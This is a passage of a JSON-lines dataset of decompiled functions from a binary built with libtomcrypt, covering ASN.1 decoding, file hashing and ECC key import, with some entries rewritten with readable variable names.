local_48,local_40);\niVar2 = (int)uVar3;\nbreak;\ncase 8:\nlocal_40[0] = *param_4;\nuVar3 = FUN_00416440(puVar6,uVar3,param_3 + local_48,local_40);\niVar2 = (int)uVar3;\nbreak;\ncase 9:\nlocal_40[0] = *param_4;\nuVar3 = FUN_00417330(puVar6,uVar3,param_3 + local_48,local_40);\niVar2 = (int)uVar3;\nbreak;\ncase 10:\nlocal_40[0] = *param_4;\nuVar3 = FUN_00415ca0(puVar6,uVar3,param_3 + local_48,local_40);\niVar2 = (int)uVar3;\nbreak;\ncase 0xb:\nlocal_40[0] = *param_4;\nuVar3 = FUN_004177a0(puVar6,param_3 + local_48,local_40);\niVar2 = (int)uVar3;\nbreak;\ndefault:\nswitchD_004190b1_caseD_c:\nreturn 0x10;\ncase 0xd:\nlocal_40[0] = *param_4;\nuVar3 = FUN_00419040(puVar6,uVar3,param_3 + local_48,local_40,0xd);\niVar2 = (int)uVar3;\nbreak;\ncase 0xe:\nlocal_40[0] = *param_4;\nuVar3 = FUN_00419980(puVar6,uVar3,param_3 + local_48,local_40);\niVar2 = (int)uVar3;\nbreak;\ncase 0xf:\nlocal_40[0] = *param_4;\nuVar3 = FUN_00419a60(puVar6,uVar3,param_3 + local_48,local_40);\niVar2 = (int)uVar3;\n}\nif (iVar2 != 0) {\nreturn uVar3;\n}\nLAB_004193d0:\n*param_4 = *param_4 - local_40[0];\nlocal_48 = local_48 + local_40[0];\nLAB_004193de:\nlVar7 = lVar7 + 1;\nuVar4 = local_48;\nif (lVar7 == param_2) break;\niVar2 = param_1[0x10];\nuVar3 = *(undefined8 *)(param_1 + 0x14);\npuVar6 = *(undefined8 **)(param_1 + 0x12);\nparam_1 = param_1 + 0x10;\n} while (iVar2 != 0);\n}\n}\n*param_4 = uVar4;\nreturn 0;\n}\nLocal Variable: local_40 : undefined8\nLocal Variable: local_48 : undefined8\nLocal Variable: local_4c : undefined4\nLocal Variable: local_58 : undefined8"}
{"Function Name": "FUN_00419a60", "Address": "00419a60", "Source Code": "int FUN_00419a60(int *param_1, ulong param_2, void *param_3, size_t *param_4) {\n    int returnValue; \n    void *allocatedMemoryPtr; \n    void **basePointerArray; \n    void *memoryTraversalPtr; \n    void **currentBasePositionPtr; \n    size_t memorySizeToCopy; \n    ulong loopCounter; \n    long longTempVar; \n    \n    if (param_2 < 2) {\n        allocatedMemoryPtr = calloc(1, *param_4); \n        returnValue = 0xd; \n        if (allocatedMemoryPtr != (void *)0x0) { \n            returnValue = FUN_00419040(param_1, param_2, allocatedMemoryPtr, param_4, 0xf); \n            if (returnValue == 0) { \n                basePointerArray = (void **)calloc(param_2, 0x10); \n                if (basePointerArray != (void **)0x0) { \n                    memoryTraversalPtr = (void *)((long)allocatedMemoryPtr + 2); \n                    \n                    if ((char)*(byte *)((long)allocatedMemoryPtr + 1) < '\\0') {\n                        memoryTraversalPtr = (void *)((long)memoryTraversalPtr + (ulong)(*(byte *)((long)allocatedMemoryPtr + 1) & 0x7f)); \n                    }\n                    memorySizeToCopy = (long)memoryTraversalPtr - (long)allocatedMemoryPtr; \n                    currentBasePositionPtr = basePointerArray; \n                    do {\n                        \n                        if ((void *)((long)allocatedMemoryPtr + *param_4) <= memoryTraversalPtr) {\n                            loopCounter = 0; \n                            qsort(basePointerArray, param_2, 0x10, FUN_00404ea0); \n                            memcpy(param_3, allocatedMemoryPtr, memorySizeToCopy); \n                            if (param_2 != 0) { \n                                do {\n                                    loopCounter++; \n                                    memcpy((void *)((long)param_3 + memorySizeToCopy), *currentBasePositionPtr, (size_t)currentBasePositionPtr[1]); \n                                    memorySizeToCopy += (long)currentBasePositionPtr[1]; \n                                    currentBasePositionPtr += 2; \n                                } while (loopCounter != param_2); \n                            }\n                            free(basePointerArray); \n                            free(allocatedMemoryPtr); \n                            return 0; \n                        }\n                        byte secondByte = *(byte *)((long)memoryTraversalPtr + 1); \n                        *currentBasePositionPtr = memoryTraversalPtr; \n                        if (0x7f < (ulong)secondByte) break; \n                        void *nextPointerOffset = (void *)((ulong)secondByte + 2); \n                        memoryTraversalPtr = (void *)((long)memoryTraversalPtr + (long)nextPointerOffset); \n                        currentBasePositionPtr[1] = nextPointerOffset; \n                        currentBasePositionPtr += 2; \n                    } while (true); \n                }\n                free(allocatedMemoryPtr); \n                returnValue = 0xd; \n            } else {\n                free(allocatedMemoryPtr); \n            }\n        }\n    } else {\n        \n        if (param_1[0x10] == *param_1) {\n            loopCounter = 1; \n            int *param1TraversalPtr = param_1; \n            do {\n                loopCounter++; \n                if (loopCounter == param_2) goto LAB_00419abb; \n                if (*(param1TraversalPtr + 0x20) != *(param1TraversalPtr + 0x10)) break; \n                param1TraversalPtr += 0x10; \n            } while (true); \n        }\n        returnValue = 0x10; \n    }\n    return returnValue; \n}"}
{"Function Name": "FUN_00419d30", "Address": "00419d30", "Source Code": "int FUN_00419d30(byte *param_1,ulong *param_2,int **param_3)\n{\nbyte bVar1;\nint iVar2;\nint *piVar3;\nint *piVar4;\nulong uVar5;\nvoid *pvVar6;\nulong uVar7;\nbyte *pbVar8;\nbyte *pbVar9;\nulong uVar10;\nbyte *pbVar11;\nbyte bVar12;\nlong lVar13;\nulong local_40 [2];\nif (param_1 == (byte *)0x0) {\nFUN_00410bc0(\"in != NULL\",\"libtomcrypt.c\",0x4b0e);\n}\nif (param_2 == (ulong *)0x0) {\nFUN_00410bc0(\"inlen != NULL\",\"libtomcrypt.c\",0x4b0f);\n}\nif (param_3 == (int **)0x0) {\nFUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x4b10);\n}\nuVar5 = *param_2;\nif (uVar5 == 0) {\nuVar10 = 0;\npiVar4 = (int *)0x0;\nLAB_00419f4b:\ndo {\nwhile (piVar3 = piVar4, *(int **)(piVar3 + 8) != (int *)0x0) {\npiVar4 = *(int **)(piVar3 + 0xe);\nif (*(int **)(piVar3 + 0xe) == (int *)0x0) {\npiVar4 = *(int **)(piVar3 + 8);\n}\n}\npiVar4 = *(int **)(piVar3 + 0xe);\n} while (*(int **)(piVar3 + 0xe) != (int *)0x0);\n*param_3 = piVar3;\n*param_2 = uVar10;\nreturn 0;\n}\nbVar12 = *param_1;\nif (uVar5 < 2) {\npiVar4 = (int *)0x0;\n}\nelse {\nuVar10 = 0;\npiVar4 = (int *)0x0;\ndo {\nbVar1 = param_1[1];\npbVar11 = param_1 + 2;\nif ((ulong)bVar1 < 0x80) {\nlocal_40[0] = (ulong)bVar1 + 2;\n}\nelse {\nuVar7 = (ulong)(bVar1 & 0x7f);\nlocal_40[0] = 0xffffffff;\nif ((uVar7 - 1 < 4) && (uVar7 <= uVar5 - 2)) {\nlocal_40[0] = 0;\npbVar8 = pbVar11;\ndo {\npbVar9 = pbVar8 + 1;\nlocal_40[0] = (ulong)*pbVar8 | local_40[0] << 8;\npbVar8 = pbVar9;\n} while (pbVar9 != pbVar11 + uVar7);\nlocal_40[0] = local_40[0] + uVar7 + 2;\n}\n}\nif (uVar5 < local_40[0]) {\niVar2 = 7;\ngoto LAB_00419e38;\n}\nif (piVar4 == (int *)0x0) {\npiVar4 = (int *)calloc(1,0x40);\nif (piVar4 != (int *)0x0) goto LAB_00419df3;\nLAB_00419e2d:\niVar2 = 0xd;\ngoto LAB_00419e38;\n}\npiVar3 = (int *)calloc(1,0x40);\n*(int **)(piVar4 + 10) = piVar3;\nif (piVar3 == (int *)0x0) {\niVar2 = 0xd;\ngoto LAB_00419e38;\n}\n*(int **)(piVar3 + 8) = piVar4;\npiVar4 = piVar3;\nLAB_00419df3:\nswitch(bVar12) {\ndefault:\npiVar4 = *(int **)(piVar4 + 8);\nfree(*(void **)(piVar4 + 10));\n*(undefined8 *)(piVar4 + 10) = 0;\ngoto LAB_00419f4b;\ncase 1:\n*piVar4 = 1;\n*(undefined8 *)(piVar4 + 4) = 1;\npvVar6 = calloc(1,4);\nuVar5 = *param_2;\n*(void **)(piVar4 + 2) = pvVar6;\niVar2 = FUN_00414bd0(param_1,uVar5,pvVar6);\nif (iVar2 == 0) {\nlocal_40[0] = 3;\ngoto LAB_00419f10;\n}\ngoto LAB_00419e38;\ncase 2:\n*piVar4 = 2;\n*(undefined8 *)(piVar4 + 4) = 1;\niVar2 = (*DAT_00669910)(piVar4 + 2);\nif ((iVar2 != 0) ||\n(iVar2 = FUN_00414e20(param_1,*param_2,*(undefined8 *)(piVar4 + 2)), iVar2 != 0))\ngoto LAB_00419e38;\niVar2 = FUN_00416600(*(undefined8 *)(piVar4 + 2),local_40);\nbreak;\ncase 3:\n*piVar4 = 4;\n*(ulong *)(piVar4 + 4) = local_40[0] * 8;\npvVar6 = calloc(1,local_40[0] * 8);\n*(void **)(piVar4 + 2) = pvVar6;\nif (pvVar6 == (void *)0x0) goto LAB_00419e2d;\niVar2 = FUN_00414a30(param_1,*param_2,pvVar6,piVar4 + 4);\nif (iVar2 != 0) goto LAB_00419e38;\niVar2 = FUN_00415fc0(*(undefined8 *)(piVar4 + 4),local_40);\nbreak;\ncase 4:\n*piVar4 = 5;\n*(ulong *)(piVar4 + 4) = local_40[0];\npvVar6 = calloc(1,local_40[0]);\n*(void **)(piVar4 + 2) = pvVar6;\nif (pvVar6 == (void *)0x0) goto LAB_00419e2d;\niVar2 = FUN_00415180(param_1,*param_2,pvVar6,piVar4 + 4);\nif (iVar2 != 0) goto LAB_00419e38;\niVar2 = FUN_00416f50(*(undefined8 *)(piVar4 + 4),local_40);\nbreak;\ncase 5:\nif ((*param_1 == 5) && (param_1[1] == 0)) {\n*piVar4 = 6;\n*(undefined8 *)(piVar4 + 2) = 0;\nlocal_40[0] = 2;\n*(undefined8 *)(piVar4 + 4) = 0;\ngoto LAB_00419f10;\n}\ngoto LAB_0041a3c2;\ncase 6:\n*piVar4 = 7;\n*(ulong *)(piVar4 + 4) = local_40[0];\npvVar6 = calloc(local_40[0],8);\n*(void **)(piVar4 + 2) = pvVar6;\nif (pvVar6 == (void *)0x0) goto LAB_00419e2d;\niVar2 = FUN_00414fb0(param_1,*param_2,pvVar6,piVar4 + 4);\nif ((iVar2 == 0) &&\n(iVar2 = FUN_00416ae0(*(undefined8 *)(piVar4 + 2),*(undefined8 *)(piVar4 + 4),local_40),\niVar2 == 0)) {\npvVar6 = realloc(*(void **)(piVar4 + 2),*(long *)(piVar4 + 4) * 8);\nif (pvVar6 != (void *)0x0) {\n*(void **)(piVar4 + 2) = pvVar6;\n}\ngoto LAB_00419f10;\n}\ngoto LAB_00419e38;\ncase 0xc:\n*piVar4 = 10;\n*(ulong *)(piVar4 + 4) = local_40[0];\npvVar6 = calloc(4,local_40[0]);\n*(void **)(piVar4 + 2) = pvVar6;\nif (pvVar6 == (void *)0x0) goto LAB_00419e2d;\niVar2 = FUN_004159d0(param_1,*param_2,pvVar6,piVar4 + 4);\nif (iVar2 != 0) goto LAB_00419e38;\niVar2 = FUN_00417f30(*(undefined8 *)(piVar4 + 2),*(undefined8 *)(piVar4 + 4),local_40);\nbreak;\ncase 0x13:\n*piVar4 = 9;\n*(ulong *)(piVar4 + 4) = local_40[0];\npvVar6 = calloc(1,local_40[0]);\n*(void **)(piVar4 + 2) = pvVar6;\nif (pvVar6 == (void *)0x0) goto LAB_00419e2d;\niVar2 = FUN_004152f0(param_1,*param_2,pvVar6,piVar4 + 4);\nif (iVar2 != 0) goto LAB_00419e38;\niVar2 = FUN_00417220(*(undefined8 *)(piVar4 + 2),*(undefined8 *)(piVar4 + 4),local_40);\nbreak;\ncase 0x16:\n*piVar4 = 8;\n*(ulong *)(piVar4 + 4) = local_40[0];\npvVar6 = calloc(1,local_40[0]);\n*(void **)(piVar4 + 2) = pvVar6;\nif (pvVar6 == (void *)0x0) goto LAB_00419e2d;\niVar2 = FUN_00414c70(param_1,*param_2,pvVar6,piVar4 + 4);\nif (iVar2 != 0) goto LAB_00419e38;\niVar2 = FUN_00416330(*(undefined8 *)(piVar4 + 2),*(undefined8 *)(piVar4 + 4),local_40);\nbreak;\ncase 0x17:\n*piVar4 = 0xb;\n*(undefined8 *)(piVar4 + 4) = 1;\npvVar6 = calloc(1,0x24);\n*(void **)(piVar4 + 2) = pvVar6;\nif (pvVar6 == (void *)0x0) goto LAB_00419e2d;\nlocal_40[0] = *param_2;\niVar2 = FUN_00415560(param_1,local_40,pvVar6);\nif (iVar2 != 0) goto LAB_00419e38;\niVar2 = FUN_00417710(*(undefined8 *)(piVar4 + 2),local_40);\nbreak;\ncase 0x30:\ncase 0x31:\n*piVar4 = (bVar12 != 0x30) + 0xd;\nuVar5 = *param_2 - 2;\n*param_2 = *param_2 - 1;\nif (param_1[1] < 0x81) {\n*param_2 = uVar5;\nlVar13 = 2;\n}\nelse {\nuVar7 = (ulong)(param_1[1] & 0x7f);\nlVar13 = uVar7 + 2;\n*param_2 = uVar5 - uVar7;\npbVar11 = pbVar11 + uVar7;\n}\nlocal_40[0] = local_40[0] - lVar13;\niVar2 = FUN_00419d30(pbVar11,local_40,piVar4 + 0xc);\nif (iVar2 == 0) {\nuVar10 = uVar10 + lVar13;\n*(int **)(*(long *)(piVar4 + 0xc) + 0x38) = piVar4;\nparam_1 = pbVar11;\ngoto LAB_00419f10;\n}\ngoto LAB_00419e38;\n}\nif (iVar2 != 0) goto LAB_00419e38;\nLAB_00419f10:\nuVar10 = uVar10 + local_40[0];\nparam_1 = param_1 + local_40[0];\nuVar5 = *param_2 - local_40[0];\n*param_2 = uVar5;\nif (uVar5 == 0) goto LAB_00419f4b;\nbVar12 = *param_1;\n} while (uVar5 != 1);\n}\nlocal_40[0] = 0xffffffff;\nLAB_0041a3c2:\niVar2 = 7;\nLAB_00419e38:\nFUN_00419c80(piVar4);\nreturn iVar2;\n}\nLocal Variable: local_40 : undefined8\nLocal Variable: local_50 : undefined8\nLocal Variable: local_58 : undefined8"}
{"Function Name": "FUN_0041a6e0", "Address": "0041a6e0", "Source Code": "undefined4 FUN_0041a6e0(long input_param) \n{\n    int valid_entry_count; \n    int *data_pointer; \n    if (input_param == 0) { \n        FUN_00410bc0(\"key != NULL\",\"libtomcrypt.c\",0x5c08); \n    }\n    valid_entry_count = 0; \n    data_pointer = &data_array; \n    while (*data_pointer != 0) { \n        valid_entry_count++; \n        data_pointer += 0xe; \n    }\n    if ((*(int *)(input_param + 4) < valid_entry_count) && (-2 < *(int *)(input_param + 4))) { \n        return **(undefined4 **)(input_param + 8); \n    }\n    return 0x7fffffff; \n}"}
{"Function Name": "FUN_0041a740", "Address": "0041a740", "Source Code": "void FUN_0041a740(int *low, int *high)\n{\n    \n    if (low == (int *)0x0) {\n        \n        FUN_00410bc0(\"low != ((void *)0)\", \"libtomcrypt.c\", 0x5e6b);\n    }\n    \n    \n    if (high == (int *)0x0) {\n        \n        FUN_00410bc0(\"high != ((void *)0)\", \"libtomcrypt.c\", 0x5e6c);\n    }\n    \n    \n    *low = 0x7fffffff;\n    \n    \n    *high = 0;\n    \n    \n    int current_value = 0xe;\n    \n    \n    int *data_pointer = &DAT_0043de58;\n    \n    \n    do {\n        \n        if (current_value < *low) {\n            *low = current_value;\n        }\n        \n        \n        if (*high < current_value) {\n            *high = current_value;\n        }\n        \n        \n        current_value = *data_pointer;\n        \n        \n        data_pointer += 0xe;\n        \n    } while (current_value != 0); \n}"}
{"Function Name": "FUN_0041a7e0", "Address": "0041a7e0", "Source Code": "undefined8 FUN_0041a7e0(uint input_value, FILE *file_pointer, long output_pointer, ulong *output_length)\n{\n    undefined8 return_value = 0xb; \n    size_t data_size; \n    long index = (long)(int)input_value; \n    \n    if (output_pointer == 0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x606f);\n    }\n    \n    if (output_length == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x6070);\n    }\n    \n    if (file_pointer == (FILE *)0x0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x6071);\n    }\n    \n    \n    if ((input_value < 0x100) && ((&DAT_0064e5c0)[index * 0x1a] != 0)) {\n        \n        if (*output_length < (ulong)(&DAT_0064e5d0)[index * 0x1a]) {\n            *output_length = (&DAT_0064e5d0)[index * 0x1a]; \n            return_value = 6; \n        } else {\n            \n            return_value = (**(code **)(&DAT_0064e668 + index * 0xd0))(context);\n            \n            if ((int)return_value == 0) {\n                do {\n                    \n                    data_size = fread(buffer, 1, 0x200, file_pointer);\n                    \n                    return_value = (**(code **)(&DAT_0064e670 + index * 0xd0))(context, buffer, data_size);\n                    \n                    if ((int)return_value != 0) {\n                        return return_value; \n                    }\n                } while (data_size == 0x200); \n                \n                return_value = (**(code **)(&DAT_0064e678 + index * 0xd0))(context, output_pointer);\n            }\n        }\n    }\n    return return_value; \n}"}
{"Function Name": "FUN_0041a970", "Address": "0041a970", "Source Code": "undefined4 FUN_0041a970(uint input_param, char *filename, long output_buffer, long output_length)\n{\n    undefined4 return_value; \n    undefined4 default_error_code = 0xb; \n    FILE *file_pointer; \n    \n    if (filename == (char *)0x0) {\n        FUN_00410bc0(\"fname != NULL\", \"libtomcrypt.c\", 0x6032); \n    }\n    \n    if (output_buffer == 0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x6033); \n    }\n    \n    if (output_length == 0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x6034); \n    }\n    \n    if ((input_param < 0x100) && ((&DAT_0064e5c0)[(long)(int)input_param * 0x1a] != 0)) {\n        file_pointer = fopen(filename, \"rb\"); \n        \n        if (file_pointer != (FILE *)0x0) {\n            return_value = FUN_0041a7e0(input_param, file_pointer, output_buffer, output_length); \n            \n            if (fclose(file_pointer) == 0) {\n                return return_value; \n            }\n            return 1; \n        }\n        return 0x11; \n    }\n    return default_error_code; \n}"}
{"Function Name": "FUN_0041aa70", "Address": "0041aa70", "Source Code": "int FUN_0041aa70(uint input_value,long input_pointer,undefined8 input_data,long output_pointer,ulong *output_length)\n{\n    int return_value = 0xb; \n    long casted_input = (long)(int)input_value; \n    \n    \n    if (input_pointer == 0) {\n        FUN_00410bc0(\"in != NULL\",\"libtomcrypt.c\",0x60b2);\n    }\n    \n    if (output_pointer == 0) {\n        FUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x60b3);\n    }\n    \n    if (output_length == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\",\"libtomcrypt.c\",0x60b4);\n    }\n    \n    \n    if ((input_value < 0x100) && (&DAT_0064e5c0)[casted_input * 0x1a] != 0) {\n        \n        if (*output_length < (ulong)(&DAT_0064e5d0)[casted_input * 0x1a]) {\n            *output_length = (&DAT_0064e5d0)[casted_input * 0x1a]; \n            return_value = 6; \n        } else {\n            void *allocated_memory = malloc(0x110); \n            if (allocated_memory != (void *)0x0) { \n                long offset_value = casted_input * 0xd0; \n                return_value = (**(code **)(&DAT_0064e668 + offset_value))(allocated_memory); \n                if (return_value == 0) { \n                    return_value = (**(code **)(&DAT_0064e670 + offset_value))(allocated_memory,input_pointer,input_data); \n                    if (return_value == 0) { \n                        return_value = (**(code **)(&DAT_0064e678 + offset_value))(allocated_memory,output_pointer); \n                        *output_length = (&DAT_0064e5d0)[casted_input * 0x1a]; \n                    }\n                }\n                free(allocated_memory); \n            } else {\n                return_value = 0xd; \n            }\n        }\n    }\n    \n    return return_value; \n}"}
{"Function Name": "FUN_0041ac10", "Address": "0041ac10", "Source Code": "int FUN_0041ac10(uint param_1,long param_2,ulong *param_3,long input_param_4,long input_param_5,\nundefined8 param_6)\n{\n    int status_code; \n    void *memory_pointer; \n    ulong size_tracker; \n    long *long_pointer; \n    long casted_param_1; \n    uint size_count; \n    long *stack_pointer; \n    long long_array[5]; \n    casted_param_1 = (long)(int)param_1; \n    if (input_param_4 == 0) { \n        FUN_00410bc0(\"in != NULL\",\"libtomcrypt.c\",0x60fe); \n    }\n    if (param_2 == 0) { \n        FUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x60ff); \n    }\n    if (param_3 == (ulong *)0x0) { \n        FUN_00410bc0(\"outlen != NULL\",\"libtomcrypt.c\",0x6100); \n    }\n    status_code = 0xb; \n    if ((param_1 < 0x100) && ((&DAT_0064e5c0)[casted_param_1 * 0x1a] != 0)) { \n        if (*param_3 < (ulong)(&DAT_0064e5d0)[casted_param_1 * 0x1a]) { \n            *param_3 = (&DAT_0064e5d0)[casted_param_1 * 0x1a]; \n            status_code = 6; \n        } else {\n            memory_pointer = malloc(0x110); \n            if (memory_pointer != (void *)0x0) { \n                status_code = (**(code **)(&DAT_0064e668 + casted_param_1 * 0xd0))(memory_pointer); \n                if (status_code == 0) { \n                    stack_pointer = (long *)&stack0x00000008; \n                    size_count = 0x28; \n                    while (true) { \n                        status_code = (**(code **)(&DAT_0064e670 + casted_param_1 * 0xd0))(memory_pointer,input_param_4,input_param_5); \n                        if (status_code != 0) break; \n                        if (size_count < 0x30) { \n                            long_pointer = (long *)((long)long_array + (ulong)size_count); \n                            size_count += 8; \n                        } else {\n                            long_pointer = stack_pointer; \n                            stack_pointer += 1; \n                        }\n                        input_param_4 = *long_pointer; \n                        if (input_param_4 == 0) { \n                            status_code = (**(code **)(&DAT_0064e678 + casted_param_1 * 0xd0))(memory_pointer,param_2); \n                            *param_3 = (&DAT_0064e5d0)[casted_param_1 * 0x1a]; \n                            break; \n                        }\n                        if (size_count < 0x30) { \n                            size_tracker = (ulong)size_count; \n                            size_count += 8; \n                            long_pointer = (long *)((long)long_array + size_tracker); \n                        } else {\n                            long_pointer = stack_pointer; \n                            stack_pointer += 1; \n                        }\n                        input_param_5 = *long_pointer; \n                    }\n                }\n                free(memory_pointer); \n            }\n        }\n    }\n    return status_code; \n}"}
{"Function Name": "FUN_0041b070", "Address": "0041b070", "Source Code": "int FUN_0041b070(char *input_string, ulong input_value, undefined4 *key_array, int *output_index)\n{\n    int return_code; \n    uint *data_pointer; \n    ulong calculated_value; \n    \n    if (input_string == (char *)0x0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x5a11);\n    }\n    \n    if (key_array == (undefined4 *)0x0) {\n        FUN_00410bc0(\"key != NULL\", \"libtomcrypt.c\", 0x5a12);\n    }\n    \n    if ((input_value & 1) == 0) {\n        return 0x10;\n    }\n    \n    return_code = FUN_0041ae70(key_array + 4, key_array + 6, key_array + 8, key_array + 10, 0);\n    if (return_code != 0) {\n        return 0xd; \n    }\n    \n    if (((byte)(*input_string - 6U) < 2) || (*input_string == '\\x04')) {\n        calculated_value = input_value - 1 >> 1; \n        \n        return_code = (*DAT_006699a0)(*(undefined8 *)(key_array + 4), input_string + 1, calculated_value);\n        if ((return_code != 0) ||\n            ((return_code = (*DAT_006699a0)(*(undefined8 *)(key_array + 6), input_string + calculated_value + 1, calculated_value), return_code != 0\n            || (return_code = (*DAT_00669938)(*(undefined8 *)(key_array + 8), 1), return_code != 0)))) {\n            goto LAB_0041b137; \n        }\n        \n        if (output_index == (int *)0x0) {\n            \n            if (calculated_value < 0xf) {\n                return_code = 0;\n            } else {\n                data_pointer = &DAT_0043de58; \n                return_code = 0; \n                \n                do {\n                    if (*data_pointer == 0) goto LAB_0041b131; \n                    data_pointer += 0xe; \n                    return_code++; \n                } while (*data_pointer < calculated_value); \n            }\n            key_array[1] = return_code; \n            *(undefined **)(key_array + 2) = &DAT_0043de20 + (long)return_code * 0x38; \n            goto LAB_0041b1cb; \n        }\n    }\n    \n    if (calculated_value == (long)*output_index) {\n        key_array[1] = 0xffffffff; \n        *(int **)(key_array + 2) = output_index; \n        goto LAB_0041b1cb; \n    }\nLAB_0041b131:\n    return_code = 7; \nLAB_0041b137:\n    \n    FUN_0041aff0(*(undefined8 *)(key_array + 4), *(undefined8 *)(key_array + 6),\n                 *(undefined8 *)(key_array + 8), *(undefined8 *)(key_array + 10), 0);\n    return return_code; \n}"}
{"Function Name": "FUN_0041b270", "Address": "0041b270", "Source Code": "int FUN_0041b270(long param_1,undefined8 param_2,undefined4 *param_3,long param_4)\n{\nint iVar1;\nint iVar2;\nint iVar3;\nint *piVar4;\nchar local_61;\nlong local_60;\nundefined8 local_58;\nundefined8 local_50;\nundefined8 local_48;\nundefined8 local_40 [2];\nif (param_1 == 0) {\nFUN_00410bc0(\"in != NULL\",\"libtomcrypt.c\",0x5c8e);\n}\nif (param_3 == (undefined4 *)0x0) {\nFUN_00410bc0(\"key != NULL\",\"libtomcrypt.c\",0x5c8f);\n}\nif (DAT_00669900 == 0) {\nFUN_00410bc0(\"ltc_mp.name != NULL\",\"libtomcrypt.c\",0x5c90);\n}\niVar3 = FUN_0041ae70(param_3 + 4,param_3 + 6,param_3 + 8,param_3 + 10,0);\nif (iVar3 != 0) {\nreturn 0xd;\n}\niVar3 = FUN_00418e50(param_1,param_2,4,1,&local_61,0,0,0);\nif (iVar3 != 0) goto LAB_0041b3ec;\nif (local_61 == '\\x01') {\n*param_3 = 1;\niVar3 = FUN_00418e50(param_1,param_2,4,1,&local_61,3,1,&local_60,2,1,\n*(undefined8 *)(param_3 + 4),2,1,*(undefined8 *)(param_3 + 6),2,1,\n*(undefined8 *)(param_3 + 10),0,0,0);\n}\nelse {\n*param_3 = 0;\niVar3 = FUN_00418e50(param_1,param_2,4,1,&local_61,3,1,&local_60,2,1,\n*(undefined8 *)(param_3 + 4),2,1,*(undefined8 *)(param_3 + 6),0,0,0);\n}\nif (iVar3 != 0) goto LAB_0041b3ec;\nif (param_4 == 0) {\nparam_3[1] = 0;\niVar3 = 0;\nif (local_60 != 0xe) {\npiVar4 = &DAT_0043de58;\niVar2 = 1;\ndo {\niVar3 = iVar2;\niVar1 = *piVar4;\nif (iVar1 == 0) {\nparam_3[1] = iVar3;\niVar3 = 7;\ngoto LAB_0041b3ec;\n}\npiVar4 = piVar4 + 0xe;\niVar2 = iVar3 + 1;\n} while (iVar1 != local_60);\nparam_3[1] = iVar3;\n}\n*(undefined **)(param_3 + 2) = &DAT_0043de20 + (long)iVar3 * 0x38;\n}\nelse {\nparam_3[1] = 0xffffffff;\n*(long *)(param_3 + 2) = param_4;\n}\niVar3 = (*DAT_00669938)(*(undefined8 *)(param_3 + 8),1);\nif ((iVar3 != 0) || (iVar3 = FUN_0041ae70(&local_58,&local_50,&local_48,local_40,0), iVar3 != 0))\ngoto LAB_0041b3ec;\niVar3 = (*DAT_00669980)(local_58,*(undefined8 *)(*(long *)(param_3 + 2) + 0x10),0x10);\nif (((iVar3 == 0) &&\n((((iVar3 = (*DAT_00669980)(local_50,*(undefined8 *)(*(long *)(param_3 + 2) + 0x18),0x10),\niVar3 == 0 && (iVar3 = (*DAT_006699d8)(*(undefined8 *)(param_3 + 6),local_48), iVar3 == 0))\n&& (iVar3 = (*DAT_006699d8)(*(undefined8 *)(param_3 + 4),local_40[0]), iVar3 == 0)) &&\n((iVar3 = (*DAT_006699e0)(local_40[0],local_58,0,local_40[0]), iVar3 == 0 &&\n(iVar3 = (*DAT_006699c8)(*(undefined8 *)(param_3 + 4),local_40[0],local_40[0]), iVar3 == 0))\n)))) && ((iVar3 = (*DAT_006699b8)(local_48,local_40[0],local_48), iVar3 == 0 &&\n(((iVar3 = (*DAT_006699a8)(local_48,*(undefined8 *)(param_3 + 4),local_48),\niVar3 == 0 &&\n(iVar3 = (*DAT_006699a8)(local_48,*(undefined8 *)(param_3 + 4),local_48),\niVar3 == 0)) &&\n(iVar3 = (*DAT_006699a8)(local_48,*(undefined8 *)(param_3 + 4),local_48),\niVar3 == 0)))))) {\niVar3 = (*DAT_006699e0)(local_48,local_58,0,local_48);\nwhile (iVar3 == 0) {\niVar3 = (*DAT_00669960)(local_48,0);\nif (iVar3 != -1) goto LAB_0041b797;\niVar3 = (*DAT_006699a8)(local_48,local_58,local_48);\n}\n}\ngoto LAB_0041b4c2;\nwhile (iVar3 = (*DAT_006699b8)(local_48,local_58,local_48), iVar3 == 0) {\nLAB_0041b797:\niVar3 = (*DAT_00669958)(local_48,local_58);\nif (iVar3 == -1) {\niVar3 = (*DAT_00669958)(local_48,local_50);\nif (iVar3 == 0) {\nFUN_0041aff0(local_58,local_50,local_48,local_40[0],0);\nreturn 0;\n}\niVar3 = 7;\nbreak;\n}\n}\nLAB_0041b4c2:\nFUN_0041aff0(local_58,local_50,local_48,local_40[0],0);\nLAB_0041b3ec:\nFUN_0041aff0(*(undefined8 *)(param_3 + 4),*(undefined8 *)(param_3 + 6),\n*(undefined8 *)(param_3 + 8),*(undefined8 *)(param_3 + 10),0);\nreturn iVar3;\n}\nLocal Variable: local_40 : undefined8\nLocal Variable: local_48 : undefined8\nLocal Variable: local_50 : undefined8\nLocal Variable: local_58 : undefined8\nLocal Variable: local_60 : undefined8\nLocal Variable: local_61 : undefined1\nLocal Variable: local_70 : undefined8\nLocal Variable: local_78 : undefined8\nLocal Variable: local_80 : undefined4\nLocal Variable: local_88 : undefined8\nLocal Variable: local_90 : undefined8\nLocal Variable: local_98 : undefined4\nLocal Variable: local_a0 : undefined8\nLocal Variable: local_a8 : undefined8\nLocal Variable: local_b0 : undefined4\nLocal Variable: local_b8 : undefined8\nLocal Variable: local_c0 : undefined8\nLocal Variable: local_c8 : undefined4\nLocal Variable: local_d0 : undefined8\nLocal Variable: local_d8 : undefined8"}
